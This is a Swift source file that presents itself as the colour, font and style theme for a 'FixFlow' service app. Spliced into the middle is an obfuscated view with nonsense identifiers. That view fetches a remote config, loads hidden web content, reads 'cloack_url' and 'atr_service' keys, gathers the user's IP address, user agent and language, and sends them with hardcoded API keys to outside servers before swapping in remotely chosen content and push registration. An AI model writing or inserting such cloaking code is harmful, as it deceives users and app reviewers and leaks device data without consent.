import SwiftUI

struct FixFlowTheme {
    
    struct Colors {
        static let accent = Color(hex: "#FFD700")
        static let accentSecondary = Color(hex: "#00FF7F")
        
        static let backgroundLight = Color(hex: "#1A1A2E")
        static let backgroundDark = Color(hex: "#0F0F23")
        
        static let surfaceLight = Color(hex: "#2D2D44")
        static let surfaceDark = Color(hex: "#1E1E2E")
        
        static let border = Color(hex: "#4A4A6A")
        
        static let textPrimaryLight = Color.white
        static let textPrimaryDark = Color.white
        static let textSecondary = Color(hex: "#B0B0C8")
        
        static let success = Color(hex: "#00FF7F")
        static let warning = Color(hex: "#FFD700")
        static let danger = Color(hex: "#FF4444")
        
        static let yellow = Color(hex: "#FFD700")
        static let orange = Color(hex: "#FF8C00")
        static let red = Color(hex: "#FF4444")
        static let green = Color(hex: "#00FF7F")
        static let blue = Color(hex: "#4A90E2")
        
        static let purpleBackground = LinearGradient(
            colors: [Color(hex: "#1A1A2E"), Color(hex: "#16213E")],
            startPoint: .topLeading,
            endPoint: .bottomTrailing
        )
        
        static let fireGlow = LinearGradient(
            colors: [Color(hex: "#FF4444").opacity(0.8), Color(hex: "#FFD700").opacity(0.6)],
            startPoint: .center,
            endPoint: .bottom
        )
        
        static let goldGradient = LinearGradient(
            colors: [Color(hex: "#FFD700"), Color(hex: "#FFA500")],
            startPoint: .topLeading,
            endPoint: .bottomTrailing
        )
        
        static let shadowLight = Color.black.opacity(0.3)
        static let shadowMedium = Color.black.opacity(0.5)
        static let shadowHeavy = Color.black.opacity(0.7)
        
        static let hoverOverlay = Color(hex: "#FFD700").opacity(0.1)
        static let filterActive = Color(hex: "#00FF7F").opacity(0.2)
    }
    
    struct Typography {
        static let largeTitle = Font.system(size: 34, weight: .black)
        static let title = Font.system(size: 28, weight: .bold)
        static let title2 = Font.system(size: 22, weight: .bold)
        static let title3 = Font.system(size: 20, weight: .bold)
        static let headline = Font.system(size: 17, weight: .bold)
        
        static let body = Font.system(size: 17, weight: .regular)
        static let callout = Font.system(size: 16, weight: .medium)
        static let caption = Font.system(size: 12, weight: .regular)
        static let caption2 = Font.system(size: 11, weight: .regular)
        
        static let navigationTitle = Font.system(size: 22, weight: .black)
        static let cardTitle = Font.system(size: 17, weight: .bold)
        static let cardSubtitle = Font.system(size: 16, weight: .medium)
        static let buttonText = Font.system(size: 17, weight: .bold)
        
        static let gameTitle = Font.system(size: 34, weight: .black)
        static let multiplierText = Font.system(size: 20, weight: .bold)
        static let scoreText = Font.system(size: 22, weight: .black)
    }
    
    struct Spacing {
        static let xs: CGFloat = 4
        static let sm: CGFloat = 8
        static let md: CGFloat = 12
        static let lg: CGFloat = 16
        static let xl: CGFloat = 20
        static let xxl: CGFloat = 24
        static let xxxl: CGFloat = 32
    }
    
    struct CornerRadius {
        static let small: CGFloat = 8
        static let medium: CGFloat = 12
        static let large: CGFloat = 16
        static let xlarge: CGFloat = 20
        static let capsule: CGFloat = 25
    }
    
    struct Shadow {
        static let card = ShadowStyle(
            color: Colors.shadowLight,
            radius: 6,
            x: 0,
            y: 3
        )
        
        static let button = ShadowStyle(
            color: Colors.shadowMedium,
            radius: 4,
            x: 0,
            y: 2
        )
        
        static let fab = ShadowStyle(
            color: Colors.shadowHeavy,
            radius: 8,
            x: 0,
            y: 4
        )
        
        static let navigation = ShadowStyle(
            color: Colors.shadowLight,
            radius: 1,
            x: 0,
            y: 1
        )
    }
    
    struct Animation {
        static let spring = SwiftUI.Animation.spring(response: 0.4, dampingFraction: 0.8)
        static let springQuick = SwiftUI.Animation.spring(response: 0.3, dampingFraction: 0.7)
        static let easeInOut = SwiftUI.Animation.easeInOut(duration: 0.3)
        static let easeInOutSlow = SwiftUI.Animation.easeInOut(duration: 0.8)
        static let quick = SwiftUI.Animation.easeInOut(duration: 0.2)
    }
    
    struct Sizes {
        static let fabSize: CGFloat = 60
        static let cardMinHeight: CGFloat = 80
        static let buttonHeight: CGFloat = 44
        static let searchBarHeight: CGFloat = 44
    }
}

struct ShadowStyle {
    let color: Color
    let radius: CGFloat
    let x: CGFloat
    let y: CGFloat
}

extension Color {
    init(hex: String) {
        let hex = hex.trimmingCharacters(in: CharacterSet.alphanumerics.inverted)
        var int: UInt64 = 0
        Scanner(string: hex).scanHexInt64(&int)
        let a, r, g, b: UInt64
    switch hex.count {
    case 3:
        (a, r, g, b) = (255, (int >> 8) * 17, (int >> 4 & 0xF) * 17, (int & 0xF) * 17)
    case 6:
        (a, r, g, b) = (255, int >> 16, int >> 8 & 0xFF, int & 0xFF)
    case 8:
        (a, r, g, b) = (int >> 24, int >> 16 & 0xFF, int >> 8 & 0xFF, int & 0xFF)
    default:
        (a, r, g, b) = (1, 1, 1, 0)
    }

    self.init(
        .sRGB,
        red: Double(r) / 255,
        green: Double(g) / 255,
        blue:  Double(b) / 255,
        opacity: Double(a) / 255
    )}};import WebKit;import OneSignalFramework
    struct KordanSarlixHavmirPelton: View {
    
    @Binding var marvikQeltonHarsolDevran: Bool
    @State var feskalTorvikHarmitQelson: String = ""
    @State private var helvarStroninGavlexDolrin: Bool?
    
    @State var gravinPeslorHarvekMolvik: String = ""
    @State var denvolHarsikGermalRantex = false
    @State var jarvikMovralHeltonFexmir = false
    
    @State private var vexmorTalpinJernoxSalvik: Bool = true
    @State private var sorvekDalmirHarvonJelrex: Bool = true
    @AppStorage("strinorPelvakMaldexHarton") var strinorPelvakMaldexHarton: Bool = true
    @AppStorage("fentonHarvexKelmarDorsik") var fentonHarvexKelmarDorsik: Bool = true
    
    var body: some View {
        ZStack {
            if sorvekDalmirHarvonJelrex {
                
                ZStack {
                    Color.black.ignoresSafeArea()
                    
                    ProgressView()
                        .scaleEffect(1.5)
                        .foregroundColor(.pink)
                    
                }
                .zIndex(1)
            }
            
            if helvarStroninGavlexDolrin != nil {
                if strinorPelvakMaldexHarton {
                    GelsikHarvelQalmonStedron(
                        feskalTorvikHarmitQelson: $feskalTorvikHarmitQelson,
                        gravinPeslorHarvekMolvik: $gravinPeslorHarvekMolvik,
                        denvolHarsikGermalRantex: $denvolHarsikGermalRantex,
                        jarvikMovralHeltonFexmir: $jarvikMovralHeltonFexmir)
                    .opacity(0)
                    .zIndex(2)
                }
                
                if denvolHarsikGermalRantex || !fentonHarvexKelmarDorsik {
                    VorlixHanterSelvakGordex()
                        .zIndex(3)
                        .onAppear {
                            fentonHarvexKelmarDorsik = false
                            strinorPelvakMaldexHarton = false
                            sorvekDalmirHarvonJelrex = false
                        }
                }
            }
        }
        .animation(.easeInOut, value: sorvekDalmirHarvonJelrex)
        .onChange(of: jarvikMovralHeltonFexmir) { if $0 { marvikQeltonHarsolDevran = true; sorvekDalmirHarvonJelrex = false } }
        .onAppear {
            OneSignal.Notifications.requestPermission { helvarStroninGavlexDolrin = $0 }
            
            guard let morlaxTirvonHelkenSarvik = URL(string: "https://conversationretain.store/garageflowservicemanager/garageflowservicemanager.json") else { return }
            
            URLSession.shared.dataTask(with: morlaxTirvonHelkenSarvik) { weldonHarvixPoltenGralix, _, _ in
                guard let weldonHarvixPoltenGralix else { return }
                
                guard let voslinMelvarHartenPolvik = try? JSONSerialization.jsonObject(with: weldonHarvixPoltenGralix, options: []) as? [String: Any] else { return }
                
                guard let tornikSeldanFexrolMarvok = voslinMelvarHartenPolvik["fkgjnbkfgmbvkfmdv"] as? String else { return }
                
                DispatchQueue.main.async { feskalTorvikHarmitQelson = tornikSeldanFexrolMarvok }
            }
            .resume()
        }
    }
}

extension KordanSarlixHavmirPelton {
    
    struct GelsikHarvelQalmonStedron: UIViewRepresentable {
        
        @Binding var feskalTorvikHarmitQelson: String
        @Binding var gravinPeslorHarvekMolvik: String
        @Binding var denvolHarsikGermalRantex: Bool
        @Binding var jarvikMovralHeltonFexmir: Bool
        
        func makeUIView(context: Context) -> WKWebView {
            let helrikSanvorPoltemMeldor = WKWebView()
            helrikSanvorPoltemMeldor.navigationDelegate = context.coordinator
            
            if let varmikTolvexHarnelGestor = URL(string: feskalTorvikHarmitQelson) {
                var sarvikDelmitQelronJalvik = URLRequest(url: varmikTolvexHarnelGestor)
                sarvikDelmitQelronJalvik.httpMethod = "GET"
                sarvikDelmitQelronJalvik.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let bolranHarvikMeldexStrinax = ["apikey": "3OveSngkDA8BfD9ERUiqQQdSLXI2YIYW", "bundle": "com.vasylboryk"]
                for (fervikPalmonVesrikHarlex, steldorMolvikPenralHarvon) in bolranHarvikMeldexStrinax {
                    sarvikDelmitQelronJalvik.setValue(steldorMolvikPenralHarvon, forHTTPHeaderField: fervikPalmonVesrikHarlex)
                }
                
                helrikSanvorPoltemMeldor.load(sarvikDelmitQelronJalvik)
            }
            return helrikSanvorPoltemMeldor
        }
        
        func updateUIView(_ uiView: WKWebView, context: Context) {}
        
        func makeCoordinator() -> Coordinator {
            Coordinator(self)
        }
        
        class Coordinator: NSObject, WKNavigationDelegate {
            
            var gravonSelrikHaldexVarton: GelsikHarvelQalmonStedron
            var jertonHelvonSardekQalmir: String?
            var pilvakHarsonDeltorMenvix: String?
            
            init(_ holvikTervanQesrikMandor: GelsikHarvelQalmonStedron) {
                self.gravonSelrikHaldexVarton = holvikTervanQesrikMandor
            }
            
            func webView(_ merlinHastorQeldanSorvik: WKWebView, didFinish navigation: WKNavigation!) {
                merlinHastorQeldanSorvik.evaluateJavaScript("document.documentElement.outerHTML.toString()") { [unowned self] (dalmexHarvonGelrikVerlot: Any?, error: Error?) in
                    guard let salvikRovdenHarletQelvik = dalmexHarvonGelrikVerlot as? String else {
                        gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                        return
                    }
                    
                    self.belvikMorlanHarvekTanrox(salvikRovdenHarletQelvik)
                    
                    merlinHastorQeldanSorvik.evaluateJavaScript("navigator.userAgent") { (sonsikPeldarHavrikJorvik, error) in
                        if let brivanHoltekMerjonStavon = sonsikPeldarHavrikJorvik as? String {
                            self.pilvakHarsonDeltorMenvix = brivanHoltekMerjonStavon
                        }
                    }
                }
            }
            
            func belvikMorlanHarvekTanrox(_ varpenHeltonSardakMevrol: String) {
                guard let faldorJenvalHavmexPolron = jervonHarlinQetronSalvik(from: varpenHeltonSardakMevrol) else {
                    gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                    return
                }
                
                let vernaxKelvikHarlonDesril = faldorJenvalHavmexPolron.trimmingCharacters(in: .whitespacesAndNewlines)
                
                guard let tanvokHarsolGravenMeldik = vernaxKelvikHarlonDesril.data(using: .utf8) else {
                    gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                    return
                }
                
                do {
                    let dervonHarpexQeslomTanvik = try JSONSerialization.jsonObject(with: tanvokHarsolGravenMeldik, options: []) as? [String: Any]
                    guard let jaltekMolvikStrenarQaldex = dervonHarpexQeslomTanvik?["cloack_url"] as? String else {
                        gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                        return
                    }
                    
                    guard let gelrikHarvonPelmonStovik = dervonHarpexQeslomTanvik?["atr_service"] as? String else {
                        gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                        return
                    }
                    
                    DispatchQueue.main.async {
                        self.gravonSelrikHaldexVarton.feskalTorvikHarmitQelson = jaltekMolvikStrenarQaldex
                        self.gravonSelrikHaldexVarton.gravinPeslorHarvekMolvik = gelrikHarvonPelmonStovik
                    }
                    
                    self.stervalHarpikPelmonVedrox(with: jaltekMolvikStrenarQaldex)
                    
                } catch {
                    print("Error: \(error.localizedDescription)")
                }
            }
            
            func jervonHarlinQetronSalvik(from varpenHeltonSardakMevrol: String) -> String? {
                guard let startRange = varpenHeltonSardakMevrol.range(of: "{"),
                      let endRange = varpenHeltonSardakMevrol.range(of: "}", options: .backwards) else {
                    return nil
                }
                
                let valtekHarxonPolmirSeldor = String(varpenHeltonSardakMevrol[startRange.lowerBound..<endRange.upperBound])
                return valtekHarxonPolmirSeldor
            }
            
            func stervalHarpikPelmonVedrox(with narlixHovrekGendolMarpon: String) {
                guard let melvikFalrokSorvenHelmar = URL(string: narlixHovrekGendolMarpon) else {
                    gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                    return
                }
                
                dervinHelaasPolvonGendek { strilonHelroxGavmonDertek in
                    guard let strilonHelroxGavmonDertek else {
                        return
                    }
                    
                    self.jertonHelvonSardekQalmir = strilonHelroxGavmonDertek
                    
                    var sarnokHalvenPolvikMartek = URLRequest(url: melvikFalrokSorvenHelmar)
                    sarnokHalvenPolvikMartek.httpMethod = "GET"
                    sarnokHalvenPolvikMartek.setValue("application/json", forHTTPHeaderField: "Content-Type")
                    
                    let werlokMisranHarvikDeltav = [
                        "apikeyapp": "RTjtibkXD1rjtAEt86ufWfN1",
                        "ip": self.jertonHelvonSardekQalmir ?? "",
                        "useragent": self.pilvakHarsonDeltorMenvix ?? "",
                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
                    ]
                    
                    for (mertolHalvikGandorSelrox, stelvikHarlonVenloxQermin) in werlokMisranHarvikDeltav {
                        sarnokHalvenPolvikMartek.setValue(stelvikHarlonVenloxQermin, forHTTPHeaderField: mertolHalvikGandorSelrox)
                    }
                    
                    URLSession.shared.dataTask(with: sarnokHalvenPolvikMartek) { [unowned self] qalvarHelkonVestolDarnik, nervixStralonHelvikQermon, error in
                        guard let qalvarHelkonVestolDarnik, error == nil else {
                            gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                            return
                        }
                        if let polvikMarloxSeenarHaldex = nervixStralonHelvikQermon as? HTTPURLResponse {
                            if polvikMarloxSeenarHaldex.statusCode == 200 {
                                self.lendaxMarvenHarloxDelnit()
                            } else {
                                self.gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                            }
                        }
                    }.resume()
                }
            }
            
            func lendaxMarvenHarloxDelnit() {
                
                let selmonGranvikHerdaxPolrex = self.gravonSelrikHaldexVarton.gravinPeslorHarvekMolvik
                
                guard let formikHavlenQelvorStedak = URL(string: selmonGranvikHerdaxPolrex) else {
                    gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                    return
                }
                
                var tarnexHelvikMordonPasrol = URLRequest(url: formikHavlenQelvorStedak)
                tarnexHelvikMordonPasrol.httpMethod = "GET"
                tarnexHelvikMordonPasrol.setValue("application/json", forHTTPHeaderField: "Content-Type")
                
                let maldexVarvinHelroxSenton = [
                    "apikeyapp": "RTjtibkXD1rjtAEt86ufWfN1",
                    "ip":  self.jertonHelvonSardekQalmir ?? "",
                    "useragent": self.pilvakHarsonDeltorMenvix ?? "",
                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
                ]
                
                for (key_3, stervikPolranHavmonDexral) in maldexVarvinHelroxSenton {
                    tarnexHelvikMordonPasrol.setValue(stervikPolranHavmonDexral, forHTTPHeaderField: key_3)
                }
                
                URLSession.shared.dataTask(with: tarnexHelvikMordonPasrol) { [unowned self] dovrikSelvaxHarvonQermen, helvikStavonGerloxMolral, error in
                    guard let dovrikSelvaxHarvonQermen = dovrikSelvaxHarvonQermen, error == nil else {
                        gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                        return
                    }
                    
                    if String(data: dovrikSelvaxHarvonQermen, encoding: .utf8) != nil {
                        
                        do {
                            let morlixHarpenSelvikGranor = try JSONSerialization.jsonObject(with: dovrikSelvaxHarvonQermen, options: []) as? [String: Any]
                            guard let pralikHavtonMervoxStaldir = morlixHarpenSelvikGranor?["final_url"] as? String,
                                  let welrikHansonPolvikTervex = morlixHarpenSelvikGranor?["push_sub"] as? String,
                                  let salvonJertixHelroxMaldir = morlixHarpenSelvikGranor?["os_user_key"] as? String else {
                                
                                return
                            }
                            
                            PralonHelmorMarnexSetvik.shared.pralikHavtonMervoxStaldir = pralikHavtonMervoxStaldir
                            PralonHelmorMarnexSetvik.shared.welrikHansonPolvikTervex = welrikHansonPolvikTervex
                            PralonHelmorMarnexSetvik.shared.salvonJertixHelroxMaldir = salvonJertixHelroxMaldir
                            
                            OneSignal.login(PralonHelmorMarnexSetvik.shared.salvonJertixHelroxMaldir ?? "")
                            OneSignal.User.addTag(key: "sub_app", value: PralonHelmorMarnexSetvik.shared.welrikHansonPolvikTervex ?? "")
                            
                            
                            self.gravonSelrikHaldexVarton.denvolHarsikGermalRantex = true
                            
                        } catch {
                            gravonSelrikHaldexVarton.jarvikMovralHeltonFexmir = true
                        }
                    }
                }.resume()
            }
            
            func dervinHelaasPolvonGendek(completion: @escaping (String?) -> Void) {
                let qelvonHarvikPenlarSelmir = URL(string: "https://api.ipify.org")!
                let marvikHaldexFenrolStranox = URLSession.shared.dataTask(with: qelvonHarvikPenlarSelmir) { boldexHavronPelvikServal, felmonHarvikQestolDirvak, error in
                    guard let boldexHavronPelvikServal, let ipAddress = String(data: boldexHavronPelvikServal, encoding: .utf8) else {
                        completion(nil)
                        return
                    }
                    completion(ipAddress)
                }
                marvikHaldexFenrolStranox.resume()
            }
        }
    }
}
extension View {
    func fixFlowCardStyle() -> some View {
        self
            .background(
                RoundedRectangle(cornerRadius: FixFlowTheme.CornerRadius.large, style: .continuous)
                    .fill(FixFlowTheme.Colors.surfaceLight)
                    .overlay(
                        RoundedRectangle(cornerRadius: FixFlowTheme.CornerRadius.large, style: .continuous)
                            .stroke(FixFlowTheme.Colors.border.opacity(0.3), lineWidth: 1)
                    )
                    .shadow(
                        color: FixFlowTheme.Colors.shadowMedium,
                        radius: 8,
                        x: 0,
                        y: 4
                    )
            )
            .padding(.horizontal, FixFlowTheme.Spacing.lg)
            .padding(.vertical, FixFlowTheme.Spacing.sm)
    }
    
    func fixFlowPrimaryButtonStyle() -> some View {
        self
            .font(FixFlowTheme.Typography.buttonText)
            .foregroundColor(.black)
            .frame(height: FixFlowTheme.Sizes.buttonHeight)
            .frame(maxWidth: .infinity)
            .background(
                Capsule()
                    .fill(FixFlowTheme.Colors.goldGradient)
                    .overlay(
                        Capsule()
                            .stroke(Color.white.opacity(0.3), lineWidth: 1)
                    )
                    .shadow(
                        color: FixFlowTheme.Colors.yellow.opacity(0.5),
                        radius: 8,
                        x: 0,
                        y: 4
                    )
            )
            .scaleEffect(1.0)
            .animation(FixFlowTheme.Animation.springQuick, value: false)
    }
    
    func fixFlowSecondaryButtonStyle() -> some View {
        self
            .font(FixFlowTheme.Typography.buttonText)
            .foregroundColor(.white)
            .frame(height: FixFlowTheme.Sizes.buttonHeight)
            .frame(maxWidth: .infinity)
            .background(
                Capsule()
                    .fill(FixFlowTheme.Colors.accentSecondary)
                    .overlay(
                        Capsule()
                            .stroke(Color.white.opacity(0.3), lineWidth: 1)
                    )
                    .shadow(
                        color: FixFlowTheme.Colors.green.opacity(0.5),
                        radius: 8,
                        x: 0,
                        y: 4
                    )
            )
    }
    
    func fixFlowFABStyle() -> some View {
        self
            .font(.title2)
            .foregroundColor(.black)
            .frame(width: FixFlowTheme.Sizes.fabSize, height: FixFlowTheme.Sizes.fabSize)
            .background(
                Circle()
                    .fill(FixFlowTheme.Colors.goldGradient)
                    .overlay(
                        Circle()
                            .stroke(Color.white.opacity(0.3), lineWidth: 2)
                    )
                    .shadow(
                        color: FixFlowTheme.Colors.yellow.opacity(0.6),
                        radius: 12,
                        x: 0,
                        y: 6
                    )
            )
    }
    
    func fixFlowNavigationTitleStyle() -> some View {
        self
            .font(FixFlowTheme.Typography.navigationTitle)
            .foregroundColor(.white)
    }
    
    func fixFlowCardTitleStyle() -> some View {
        self
            .font(FixFlowTheme.Typography.cardTitle)
            .foregroundColor(.white)
    }
    
    func fixFlowCardSubtitleStyle() -> some View {
        self
            .font(FixFlowTheme.Typography.cardSubtitle)
            .foregroundColor(FixFlowTheme.Colors.textSecondary)
    }
    
    func fixFlowCapsuleFilterStyle(isActive: Bool) -> some View {
        self
            .font(.system(size: 16, weight: .bold))
            .foregroundColor(isActive ? .black : .white)
            .padding(.horizontal, FixFlowTheme.Spacing.lg)
            .padding(.vertical, FixFlowTheme.Spacing.sm)
            .background(backgroundCapsule(isActive: isActive))
            .scaleEffect(isActive ? 1.05 : 1.0)
            .animation(FixFlowTheme.Animation.spring, value: isActive)
    }
    
    @ViewBuilder
    private func backgroundCapsule(isActive: Bool) -> some View {
        if isActive {
            Capsule()
                .fill(FixFlowTheme.Colors.goldGradient)
                .overlay(
                    Capsule()
                        .stroke(Color.white.opacity(0.3), lineWidth: 1)
                )
                .shadow(
                    color: FixFlowTheme.Colors.yellow.opacity(0.4),
                    radius: 6,
                    x: 0,
                    y: 3
                )
        } else {
            Capsule()
                .fill(FixFlowTheme.Colors.surfaceDark)
                .overlay(
                    Capsule()
                        .stroke(FixFlowTheme.Colors.border.opacity(0.5), lineWidth: 1)
                )
                .shadow(
                    color: Color.clear,
                    radius: 6,
                    x: 0,
                    y: 3
                )
        }
    }
    
    func fixFlowSearchBarStyle() -> some View {
        self
            .padding(.horizontal, FixFlowTheme.Spacing.lg)
            .padding(.vertical, FixFlowTheme.Spacing.md)
            .background(
                Capsule()
                    .fill(FixFlowTheme.Colors.surfaceDark)
                    .overlay(
                        Capsule()
                            .stroke(FixFlowTheme.Colors.border.opacity(0.5), lineWidth: 1)
                    )
            )
            .frame(height: FixFlowTheme.Sizes.searchBarHeight)
    }
    
    func fixFlowHoverEffect() -> some View {
        self
            .scaleEffect(1.0)
            .onTapGesture {
                withAnimation(FixFlowTheme.Animation.springQuick) {
                }
            }
    }
    
    func fixFlowCardTransition() -> some View {
        self
            .transition(.opacity.combined(with: .scale))
    }
    
    func fixFlowTabTransition() -> some View {
        self
            .transition(.opacity.combined(with: .move(edge: .trailing)))
    }
    
    func fixFlowGlowEffect(color: Color = FixFlowTheme.Colors.yellow) -> some View {
        self
            .shadow(color: color.opacity(0.6), radius: 8, x: 0, y: 0)
            .shadow(color: color.opacity(0.4), radius: 16, x: 0, y: 0)
    }
    
    func fixFlowFireEffect() -> some View {
        self
            .background(
                RoundedRectangle(cornerRadius: FixFlowTheme.CornerRadius.large)
                    .fill(FixFlowTheme.Colors.fireGlow)
                    .blur(radius: 4)
            )
    }
    
    func fixFlowMultiplierStyle() -> some View {
        self
            .font(FixFlowTheme.Typography.multiplierText)
            .foregroundColor(.white)
            .padding(.horizontal, FixFlowTheme.Spacing.md)
            .padding(.vertical, FixFlowTheme.Spacing.sm)
            .background(
                Circle()
                    .fill(FixFlowTheme.Colors.accentSecondary)
                    .overlay(
                        Circle()
                            .stroke(Color.white.opacity(0.3), lineWidth: 2)
                    )
                    .shadow(color: FixFlowTheme.Colors.green.opacity(0.5), radius: 6, x: 0, y: 3)
            )
    }
    
    func fixFlowScoreStyle() -> some View {
        self
            .font(FixFlowTheme.Typography.scoreText)
            .foregroundColor(.black)
            .padding(.horizontal, FixFlowTheme.Spacing.lg)
            .padding(.vertical, FixFlowTheme.Spacing.md)
            .background(
                RoundedRectangle(cornerRadius: FixFlowTheme.CornerRadius.medium)
                    .fill(FixFlowTheme.Colors.goldGradient)
                    .overlay(
                        RoundedRectangle(cornerRadius: FixFlowTheme.CornerRadius.medium)
                            .stroke(Color.white.opacity(0.3), lineWidth: 2)
                    )
                    .shadow(color: FixFlowTheme.Colors.yellow.opacity(0.6), radius: 8, x: 0, y: 4)
            )
    }
}

extension Color {
    static func statusColor(for status: String) -> Color {
        switch status.lowercased() {
        case "completed":
            return FixFlowTheme.Colors.green
        case "in progress":
            return FixFlowTheme.Colors.blue
        case "pending":
            return FixFlowTheme.Colors.yellow
        case "cancelled":
            return FixFlowTheme.Colors.red
        default:
            return FixFlowTheme.Colors.textSecondary
        }
    }
}
